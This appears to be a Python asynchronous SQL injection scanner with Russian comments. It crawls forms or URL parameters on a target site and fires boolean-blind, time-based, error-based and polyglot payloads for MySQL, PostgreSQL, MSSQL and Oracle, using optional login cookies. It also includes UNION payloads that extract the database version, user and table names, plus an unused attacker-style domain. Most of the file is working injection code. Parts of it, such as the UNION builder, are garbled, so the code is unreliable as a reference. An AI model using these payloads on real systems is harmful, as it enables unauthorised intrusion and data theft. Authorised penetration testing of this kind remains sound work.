import asyncio
import aiohttp
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse, parse_qs
import time
import sys
import re
import statistics
from dataclasses import dataclass
from typing import List, Dict, Tuple
from difflib import SequenceMatcher
import json
import os

# ЦВЕТНОЙ ВЫВОД (Для красоты в терминале)
class Colors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'


@dataclass
class Vulnerability:
    url: str
    param: str
    type: str
    payload: str
    details: str


class PayloadGenerator:
    def __init__(self):
        self.oob_domain = "evil-hacker.com"

    def get_polyglots(self) -> List[str]:
        return [
            "SLEEP(5) /*' or SLEEP(5) or '\" or SLEEP(5) or \"*/",
            "' OR 1=1 -- ",
            "\" OR 1=1 -- ",
            "') OR 1=1 -- ",
            ")) OR 1=1 -- ",
            "'+OR+'1'='1",
            " AND 1=1 -- "
        ]

    def get_boolean_payloads(self) -> Dict[str, List[Tuple[str, str]]]:
        return {
            "Generic_String": [
                (" AND 1=1", " AND 1=0"),
                ("' AND 'a'='a", "' AND 'a'='b"),
                ("\") AND (\"a\"=\"a", "\") AND (\"a\"=\"b"),
                ("') AND ('a'='a", "') AND ('a'='b"),
            ],
            "Generic_Numeric": [
                (" AND 1=1", " AND 1=0"),
                (" OR 1=1", " OR 1=0"),
            ],
            "MySQL_Specific": [
                ("' AND 1=1 #", "' AND 1=0 #"),
                (" AND 1=1 -- -", " AND 1=0 -- -"),
                ("' AND (SELECT 1)=1 --", "' AND (SELECT 1)=0 --"),
            ],
            "PostgreSQL_Specific": [
                (" AND 1::int=1", " AND 1::int=0"),
                (" AND TRUE", " AND FALSE"),
            ],
            "MSSQL_Specific": [
                ("' AND 1=(CASE WHEN (1=1) THEN 1 ELSE 0 END) --", "' AND 1=(CASE WHEN (1=0) THEN 1 ELSE 0 END) --"),
            ]
        }

    def get_time_payloads(self, delay: int = 5) -> Dict[str, List[str]]:
        return {
            "MySQL": [
                f" AND SLEEP({delay})",
                f"' AND SLEEP({delay}) AND '1'='1",
                f"\" AND SLEEP({delay}) AND \"1\"=\"1",
                f"' AND SLEEP({delay}) -- ",
                f"' AND (SELECT {delay} FROM (SELECT(SLEEP({delay})))a) --",
            ],
            "PostgreSQL": [
                f"'; SELECT pg_sleep({delay}); --",
                f" AND (SELECT pg_sleep({delay})) IS NOT NULL",
                f"'; SELECT pg_sleep({delay}); --",
                f" AND 1=(SELECT CASE WHEN (1=1) THEN pg_sleep({delay}) ELSE 1 END) --",
            ],
            "MSSQL": [
                f"'; WAITFOR DELAY '0:0:{delay}'; --",
                f" WAITFOR DELAY '0:0:{delay}'",
                f"'; SELECT COUNT(*) FROM sys.objects AS T1, sys.objects AS T2, sys.objects AS T3, sys.objects AS T4; --",
            ],
            "Oracle": [
                f"' AND 123=DBMS_PIPE.RECEIVE_MESSAGE('RDS',{delay}) --",
                f"' AND (SELECT DBMS_SESSION.SLEEP({delay}) FROM DUAL) IS NULL --"
            ]
        }

    def get_error_payloads(self) -> List[str]:
        return[
            "'", "\"", "')", "'));",
            "' AND (SELECT 1 FROM (SELECT(SLEEP(0)))a) -- ",
            "' AND 1=CONVERT(int,(SELECT @@VERSION)) -- ",
            "' AND 1=EXTRACTVALUE(1, CONCAT(0x5c, (SELECT USER()))) -- ",
            "'; SELECT pg_sleep(0); --",
            " AND 1=1 AND 1=CAST(@@version AS INT) --",
        ]

    def get_union_test_payloads(self, num_columns: int) -> Dict[str, List[str]]:
        if num_columns <= 0:
            return {}

        nulls = ','.join(['NULL'] * num_columns)

        union_data = {
            "MySQL": [
                f"' UNION SELECT {nulls[:-5]}, CONCAT(version(), 0x3a, user()) --",
                f"' UNION SELECT {nulls[:-5]}, table_name FROM information_schema.tables WHERE table_schema != 'mysql' LIMIT 1 --"
            ],
            "PostgreSQL": [
                f"' UNION SELECT {nulls[:-5]}, version(), current_user, NULL, NULL --",
                f"' UNION SELECT {nulls[:-5]}, table_name FROM information_schema.tables WHERE table_schema='public' LIMIT 1 --"
            ],
            "MSSQL": [
                f"' UNION SELECT {nulls[:-5]}, @@version, SUSER_NAME(), NULL, NULL --",
                f"' UNION SELECT {nulls[:-5]}, table_name FROM information_schema.tables WHERE table_catalog = DB_NAME() AND table_type='BASE TABLE' ORDER BY 1 --"
            ],
            "Oracle": [
                f"' UNION SELECT {nulls[:-5]}, banner FROM v$version WHERE rownum=1 --",
                f"' UNION SELECT {nulls[:-5]}, table_name FROM all_tables WHERE rownum=1 --"
            ]
        }

        for db, payloads in union_data.items():
            for i in range(len(payloads)):
                payloads[i] = payloads[i].replace(nulls[:-5], ','.join(
                    ['NULL'] * (num_columns - 5)) + 'user')

        return union_data

#Класс-утилита для загрузки конфигурация и данных. Куки.
class ConfigLoader:
    @staticmethod
    def load_cookies_from_file(filename: str) -> Dict[str, str]:
        """
        Загружает куки из JSON-файла, игнорируя пустые значения.
        """
        if not os.path.exists(filename):
            print(f"[{Colors.WARNING}Внимание{Colors.ENDC}] Файл '{filename}' не найден.")
            return {}

        try:
            with open(filename, 'r', encoding='utf-8') as f:
                raw_cookies = json.load(f)
                # Фильтруем словарь: оставляем только те куки, где значение не пустое
                valid_cookies = {
                    k: v
                    for k, v in raw_cookies.items()
                    if v and isinstance(v, str)
                }
                return valid_cookies
        except json.JSONDecodeError:
            print(f"[{Colors.FAIL}Ошибка{Colors.ENDC}] Неверный формат JSON в файле '{filename}'. Проверьте синтаксис (запятые, кавычки).")
            return {}
        except Exception as e:
            print(f"[{Colors.FAIL}Ошибка{Colors.ENDC}] Не удалось прочитать файл куки: {e}")
            return {}

class AnalysisEngine:
    def __init__(self):
        self.errors = {
            "MySQL": r"(SQL syntax.*MySQL|Warning.*mysql_.*|valid MySQL result)",
            "PostgreSQL": r"(PostgreSQL.*ERROR|Warning.*pg_.*|valid PostgreSQL result|Npgsql)",
            "MSSQL": r"(Driver.* SQL[\-\s]Server|OLE DB.* SQL Server|\.SqlClient\.)",
            "Oracle": r"(ORA-\d{5}|Oracle error|Oracle.*Driver|Warning.*oci_.*)",
            "SQLite": r"(SQLite/JDBCDriver|SQLite.Exception|System.Data.SQLite.SQLiteException)"
        }

    def check_for_errors(self, html_content: str, return_fragment: bool = False) -> Tuple[str, str] or str:
        """Проверяет HTML-контент на наличие известных сообщений об ошибках SQL."""
        html_content_lower = html_content.lower()

        common_error_keywords = ['syntax error', 'mysql_fetch', 'supplied argument is not a valid', 'near \'',
                                 'error in your sql syntax']

        error_patterns = {
            'MySQL': [r'mysql_fetch', r'error in your sql syntax'],
            'PostgreSQL': [r'pg_query', r'error in your sql statement'],
            'MSSQL': [r'unclosed quotation mark', r'microsoft ole db provider'],
        }

        found_db = None

        for db, patterns in error_patterns.items():
            for pattern in patterns:
                if re.search(pattern, html_content_lower):
                    found_db = db
                    break
            if found_db:
                break

        if found_db or any(keyword in html_content_lower for keyword in common_error_keywords):
            for keyword in common_error_keywords:
                if keyword in html_content_lower:
                    start_index = html_content_lower.find(keyword)
                    context_start = max(0, start_index - 50)
                    context_end = min(len(html_content_lower), start_index + 100 + len(keyword))
                    error_fragment = html_content[context_start:context_end].strip()

                    if return_fragment:
                        return found_db or "Generic", error_fragment
                    else:
                        return found_db or "Generic"

        if return_fragment:
            return None, ""
        else:
            return None

    def compare_pages(self, page1: str, page2: str) -> float:
        return SequenceMatcher(None, page1, page2).ratio()

    def is_boolean_vulnerable(self, original: str, true_resp: str, false_resp: str) -> bool:
        """Логика принятия решения для Boolean-Blind."""
        similarity_true = self.compare_pages(original, true_resp)
        similarity_false = self.compare_pages(original, false_resp)

        if similarity_true > 0.95 and similarity_false < 0.90:
            return True
        return False

    def is_time_vulnerable(self, normal_times: List[float], attack_times: List[float]) -> bool:
        """Статистический анализ времени."""
        avg_normal = statistics.mean(normal_times)
        avg_attack = statistics.mean(attack_times)

        if len(normal_times) > 2:
            stdev = statistics.stdev(normal_times)
            threshold = avg_normal + max(3 * stdev, 2)
            if avg_attack > threshold:
                return True
        else:
            # Резервный вариант, если мало данных
            if avg_attack > avg_normal + 2:
                return True


class AsyncScanner:
    def __init__(self, target_url, request_method='GET', initial_data=None, cookies=None):
        """Инициализация сканера. Поддерживает выбор метода GET/POST."""
        self.target_url = target_url.split('?')[0]
        self.parsed_url = urlparse(target_url)
        self.base_url = f"{self.parsed_url.scheme}://{self.parsed_url.netloc}{self.parsed_url.path}"

        self.request_method = request_method.upper()
        self.cookies = cookies

        url_params = parse_qs(self.parsed_url.query)
        if url_params and not initial_data:
            self.all_params = {k: v[0] for k, v in url_params.items()}
            self.request_method = 'GET'
        elif initial_data:
            self.all_params = initial_data
        else:
            self.all_params = {}

        self.payloads = PayloadGenerator()
        self.analyzer = AnalysisEngine()
        self.vulnerabilities = []

        self.sem = asyncio.Semaphore(10)
        self.ignore_params = {
            'Submit', 'btn', 'action',
            'csrf_token', 'xsrf_token', '_token', 'token',
            '__viewstate', '__eventvalidation',
            'search_source', 'return_to'
        }
        self.scan_params = [
            k for k in self.all_params.keys()
            if k.lower() not in self.ignore_params
        ]

    async def _fetch(self, session, payload_params):
        """Внутренняя функция для отправки одного запроса, поддерживает GET и POST."""
        start = time.time()
        try:
            async with self.sem:
                if self.request_method == 'GET':
                    response = await session.get(self.base_url, params=payload_params, timeout=15)
                elif self.request_method == 'POST':
                    response = await session.post(self.base_url, data=payload_params, timeout=15)
                else:
                    raise ValueError(f"Неподдерживаемый метод: {self.request_method}")

                text = await response.text()
                return text, time.time() - start

        except Exception:
            return "", time.time() - start

    async def scan_boolean(self, session, param, original_val, original_html):
        print(f"[*] Проверка Boolean-Blind ({self.request_method}) для параметра: {param}")

        all_payloads = self.payloads.get_boolean_payloads()

        for group, pairs in all_payloads.items():
            for true_pay, false_pay in pairs:
                p_true = self.all_params.copy()
                p_true[param] = original_val + true_pay

                p_false = self.all_params.copy()
                p_false[param] = original_val + false_pay

                # Асинхронный запуск двух запросов одновременно
                (html_true, _), (html_false, _) = await asyncio.gather(
                    self._fetch(session, p_true),
                    self._fetch(session, p_false)
                )

                if self.analyzer.is_boolean_vulnerable(original_html, html_true, html_false):
                    self.vulnerabilities.append(Vulnerability(
                        self.base_url, param, "Boolean-Based Blind",
                        f"True: {true_pay} | False: {false_pay}",
                        f"Группа: {group}"
                    ))
                    print(f"{Colors.OKGREEN}[+] НАЙДЕНА УЯЗВИМОСТЬ (Boolean)!{Colors.ENDC}")
                    return

    async def scan_time(self, session, param, original_val):
        print(f"[*] Проверка Time-Based ({self.request_method}) для параметра: {param}")

        # Сначала измеряем "нормальное" время отклика (Baseline)
        normal_times = []
        for _ in range(8):
            _, t = await self._fetch(session, self.all_params)
            normal_times.append(t)

        delay = 3
        all_payloads = self.payloads.get_time_payloads(delay)

        for db, payloads in all_payloads.items():
            for payload in payloads:
                p_attack = self.all_params.copy()
                p_attack[param] = original_val + payload

                attack_times = []
                for _ in range(2):
                    _, t = await self._fetch(session, p_attack)
                    attack_times.append(t)

                if self.analyzer.is_time_vulnerable(normal_times, attack_times):
                    self.vulnerabilities.append(Vulnerability(
                        self.base_url, param, f"Time-Based Blind ({db})",
                        payload,
                        f"Средняя задержка: {statistics.mean(attack_times):.2f} сек"
                    ))
                    print(f"{Colors.OKGREEN}[+] НАЙДЕНА УЯЗВИМОСТЬ (Time-Based)!{Colors.ENDC}")
                    return

    async def scan_error(self, session, param, original_val):
        print(f"[*] Проверка Error-Based ({self.request_method}) для параметра: {param}")
        error_chars = self.payloads.get_error_payloads()

        tasks = []
        for char in error_chars:
            p = self.all_params.copy()
            p[param] = original_val + char
            tasks.append(self._fetch(session, p))

        results = await asyncio.gather(*tasks)

        for i, (html, _) in enumerate(results):
            error_check_result = self.analyzer.check_for_errors(html, return_fragment=True)

            if isinstance(error_check_result, tuple) and error_check_result[0]:
                db, error_fragment = error_check_result

                self.vulnerabilities.append(Vulnerability(
                    url=self.base_url,
                    param=param,
                    type=f"Error-Based ({db})",
                    payload=error_chars[i],
                    details=f"Сервер вернул текст ошибки БД. Фрагмент: {error_fragment[:150]}..."
                ))
                print(f"{Colors.OKGREEN}[+] НАЙДЕНА УЯЗВИМОСТЬ (Error)!{Colors.ENDC}")
                return

    async def run(self):
        """Основной цикл сканирования."""

        print(f"{Colors.HEADER}=== ЗАПУСК АСИНХРОННОГО СКАНЕРА V2.0 ({self.request_method}) ==={Colors.ENDC}")

        if not self.scan_params:
            print(
                f"{Colors.WARNING}Не найдено параметров для сканирования (или все параметры в игнор-листе).{Colors.ENDC}")
            print(f"Все параметры: {list(self.all_params.keys())}")
            return

        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        }

        async with aiohttp.ClientSession(headers=headers, cookies=self.cookies) as session:
            # Получаем оригинал страницы (Baseline)
            print("[*] Калибровка: получение оригинальной страницы...")
            original_html, _ = await self._fetch(session, self.all_params)

            tasks = []

            # Создаем задачи для каждого параметра
            for param in self.scan_params:
                orig_val = self.all_params[param]
                tasks.append(self.scan_error(session, param, orig_val))
                tasks.append(self.scan_boolean(session, param, orig_val, original_html))
                tasks.append(self.scan_time(session, param, orig_val))

            await asyncio.gather(*tasks)

        print(f"\n{Colors.HEADER}=== ИТОГОВЫЙ ОТЧЕТ ==={Colors.ENDC}")
        if not self.vulnerabilities:
            print(f"{Colors.WARNING}Уязвимости не найдены.{Colors.ENDC}")
        for v in self.vulnerabilities:
            print(f"{Colors.OKBLUE}[Тип]: {v.type}{Colors.ENDC}")
            print(f"  URL: {v.url}")
            print(f"  Метод: {self.request_method}")
            print(f"  Параметр: {v.param}")
            print(f"  Payload: {v.payload}")
            print(f"  Детали: {v.details}")
            print("-" * 40)


# ФУНКЦИИ АВТОМАТИЧЕСКОГО ПОИСКА ФОРМ

async def _get_form_details(session, form_tag, base_url):
    """Парсит HTML-тег <form> и извлекает все необходимые данные для сканирования."""

    # Определяем URL назначения (action) и метод
    action = form_tag.get('action') or base_url
    target_url = urljoin(base_url, action)
    method = form_tag.get('method', 'GET').upper()

    parsed_action_url = urlparse(target_url)
    get_params_from_action = parse_qs(parsed_action_url.query)

    initial_data = {}

    for k, v in get_params_from_action.items():
        initial_data[k] = v[0]

    for element in form_tag.find_all(['input', 'textarea', 'select']):
        name = element.get('name')

        if not name:
            continue

        tag_type = element.get('type', 'text').lower()


        if tag_type in ('submit', 'reset', 'file', 'button', 'image'):
            continue

        value = element.get('value', '')

        if not value:
            if tag_type == 'email':
                value = 'test@example.com'
            elif tag_type == 'url':
                value = 'http://example.com'
            elif tag_type == 'date':
                value = '2020-01-01'
            elif tag_type == 'number':
                value = '1'
            elif tag_type in ('text', 'search', 'password', 'textarea', 'hidden'):
                value = "test"

        if element.name == 'select':
            option = element.find('option', selected=True) or element.find('option')
            if option:
                value = option.get('value', option.text).strip()
            else:
                value = "1"

        initial_data[name] = value

    return target_url, method, initial_data


async def scan_form_from_url(url: str, initial_cookies: Dict[str, str] = None):
    """
    Автоматически находит все формы на странице и запускает для каждой из них AsyncScanner.
    Принимает и использует initial_cookies для аутентификации при получении HTML.
    """
    print(f"{Colors.HEADER}>>> ЭТАП 1: АВТОМАТИЧЕСКОЕ ОБНАРУЖЕНИЕ ФОРМ НА {url} <<< {Colors.ENDC}")

    all_vulnerabilities = []

    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
    }

    try:
       async with aiohttp.ClientSession(headers=headers, cookies=initial_cookies) as session:

            # 1. Скачиваем HTML
            async with session.get(url, timeout=15) as response:
                if response.status != 200:
                    print(f"{Colors.FAIL}Не удалось получить страницу. Статус: {response.status}{Colors.ENDC}")
                    return
                html = await response.text()


            soup = BeautifulSoup(html, 'html.parser')
            forms = soup.find_all('form')

            if not forms:
                print(f"{Colors.WARNING}На странице не найдено HTML-форм.{Colors.ENDC}")
                return

            print(f"[*] Найдено {len(forms)} форм. Запуск сканирования...")

            #Итерация и запуск AsyncScanner для каждой формы
            for i, form_tag in enumerate(forms):
                target_url, method, initial_data = await _get_form_details(session, form_tag, url)

                print(f"\n=== НАЙДЕНА ФОРМА #{i + 1} ===")
                print(f"  Метод: {method}")
                print(f"  URL: {target_url}")
                print(f"  Поля: {list(initial_data.keys())}")

                scanner = AsyncScanner(
                    target_url,
                    request_method=method,
                    initial_data=initial_data,
                    cookies=initial_cookies  #
                )
                await scanner.run()
                all_vulnerabilities.extend(scanner.vulnerabilities)

    except Exception as e:
        print(f"{Colors.FAIL}Критическая ошибка при парсинге или сканировании: {e}{Colors.ENDC}")
        import traceback
        traceback.print_exc()


    if all_vulnerabilities:
        print(f"\n{Colors.HEADER}--- СВОДНЫЙ ОТЧЕТ ПО ВСЕМ ФОРМАМ ---{Colors.ENDC}")
        for v in all_vulnerabilities:
            print(f"{Colors.OKBLUE}[Тип]: {v.type}{Colors.ENDC}")
            print(f"  Параметр: {v.param}")
            print(f"  Payload: {v.payload}")
            print("-" * 40)


if __name__ == "__main__":
    SESSION_COOKIES = ConfigLoader.load_cookies_from_file('cookies.json')

    if SESSION_COOKIES:
        print(
            f"[{Colors.OKGREEN}Успех{Colors.ENDC}] Загружены аутентификационные куки для {len(SESSION_COOKIES)} параметров.")
    else:
        print(f"[{Colors.WARNING}Режим гостя{Colors.ENDC}] Сканирование будет выполнено без аутентификации.")

    if len(sys.argv) < 2:
        input_url = input(f"{Colors.WARNING}Сканируйте только те веб-сервисы, которыми владеете или на которые у вас есть разрешение!{Colors.ENDC}"
                          "\nВведите URL: ")
    else:
        input_url = sys.argv[1]

    if not input_url:
        print("URL не введен. Выход.")
        sys.exit(1)

    scan_performed = False

    # СКАНИРОВАНИЕ КЛАССИЧЕСКИХ GET-ПАРАМЕТРОВ
    if '?' in input_url and urlparse(input_url).query:
        print(f"\n{Colors.HEADER}>>> ЭТАП А: КЛАССИЧЕСКОЕ СКАНИРОВАНИЕ GET-ПАРАМЕТРОВ <<< {Colors.ENDC}")
        try:
            scanner = AsyncScanner(input_url, cookies=SESSION_COOKIES)
            asyncio.run(scanner.run())
            scan_performed = True
        except Exception as e:
            print(f"{Colors.FAIL}Ошибка при запуске классического GET-сканера: {e}{Colors.ENDC}")
            import traceback

            traceback.print_exc()

    print(f"\n{Colors.HEADER}>>> ЭТАП Б: АВТОМАТИЧЕСКИЙ ПОИСК И СКАНИРОВАНИЕ ФОРМ <<< {Colors.ENDC}")
    try:
        base_url_for_forms = input_url.split('?')[0]
        asyncio.run(scan_form_from_url(base_url_for_forms, initial_cookies=SESSION_COOKIES))
        scan_performed = True
    except Exception as e:
        print(f"{Colors.FAIL}Ошибка при запуске поиска и сканирования форм: {e}{Colors.ENDC}")
        import traceback

        traceback.print_exc()

    if not scan_performed:
        print(f"{Colors.WARNING}Сканирование не выполнено. Проверьте правильность введенного URL.{Colors.ENDC}")
